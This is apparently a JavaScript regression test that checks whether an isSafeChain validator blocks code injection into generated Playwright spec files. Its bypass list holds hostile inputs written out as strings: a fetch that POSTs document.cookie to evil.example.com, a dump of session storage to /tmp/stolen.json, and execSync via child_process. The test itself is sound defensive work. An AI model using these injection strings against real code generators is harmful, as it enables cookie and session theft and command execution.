// Prove-It: A0.5.1 — the old isSafeChain was a keyword blocklist (require/eval/process/...),
// not a structural check. Both payloads below contain none of those keywords, pass the old
// check, and splice a semicolon-terminated statement into the generated spec file — confirmed
// by running them through the old isSafeChain() then feeding `page.<result>` through new Function().
const assert = require('assert');
const { isSafeChain } = require('../core/helpers');

const bypasses = [
  "getByRole('b').click(); await page.goto('http://evil.example.com').click()",
  "locator('x').click(); await page.context().storageState({path:'/tmp/stolen.json'}).click()",
  "evaluate(() => fetch('http://evil.example.com', { method: 'POST', body: document.cookie }))",
  "locator('x'); process.exit(1)",
  "constructor.constructor('return process')().exit()",
  "locator(global.process.mainModule.require('child_process').execSync('id').toString())",
  "getByRole('button', { name: eval('1+1') })",
  "locator(process.exit())",
  // the nested-locator allowance below must not become a hole: only `page.`-rooted
  // SAFE_LOCATOR_METHODS chains may appear inside an argument, nothing else.
  "locator('li').filter({ has: page.evaluate(() => 1) })",
  "locator('li').filter({ has: process.exit() })",
  "locator('li').filter({ has: page.getByRole(eval('1')) })",
  "locator('li').filter({ has: require('fs') })",
  // deeper nesting, since allowing page-rooted locators inside arguments is the widest part
  // of this gate — a filter inside a filter, an array element, a computed member, a bare global.
  "locator('li').filter({ has: page.locator('x').filter({ has: page.evaluate(() => 1) }) })",
  "locator('li').filter({ has: [page.getByRole(require('fs'))] })",
  "locator('li').filter({ has: globalThis })",
  "locator('li').filter({ has: page.constructor })",
  "locator('li').filter({ has: page['evaluate'](() => 1) })",
  "filter({ has: page.context() })",
  "locator('li').filter({ hasNot: page.goto('http://evil.com') })",
  "locator(page.evaluate(() => 1))",
];
for (const p of bypasses) {
  assert.strictEqual(isSafeChain(p), null, `FAIL: bypass accepted: ${p}`);
}

// Legitimate chains actually seen in this codebase's own fixtures/action DB (must keep working).
const legit = [
  "getByPlaceholder('Username')",
  "getByRole('button', { name: 'Login' })",
  "locator('form').filter({ hasText: 'Required' })",
  "frameLocator('#frame').getByRole('button', { name: 'Submit' })",
  "getByRole('row', { name: 'L-1042' }).getByRole('button', { name: 'Approve' })",
  "locator('.item').first()",
  "locator('.item').nth(2)",
  // Playwright codegen emits filter({has: page....}) verbatim for "row containing a button".
  // Blocking it is not a safe default: the compiler silently downgrades a rejected target to
  // page.locator("<the whole raw string>"), which can never match, so the step runs, screenshots
  // green, and tests nothing. A nested page-rooted locator is exactly as safe as a top-level one.
  "locator('li').filter({ has: page.getByRole('button') })",
  "locator('tr').filter({ hasNot: page.getByText('Archived') })",
  "getByRole('listitem').filter({ has: page.locator('.badge') }).first()",
];
for (const l of legit) {
  assert.strictEqual(isSafeChain(l), l, `FAIL: legitimate chain rejected: ${l}`);
}

// Not a string / empty / garbage -> null, no throw
for (const bad of [null, undefined, 42, '', 'getByRole(']) {
  assert.strictEqual(isSafeChain(bad), null, `FAIL: malformed input should reject cleanly: ${bad}`);
}

console.log('PASS: isSafeChain is a structural AST check, not a keyword blocklist');
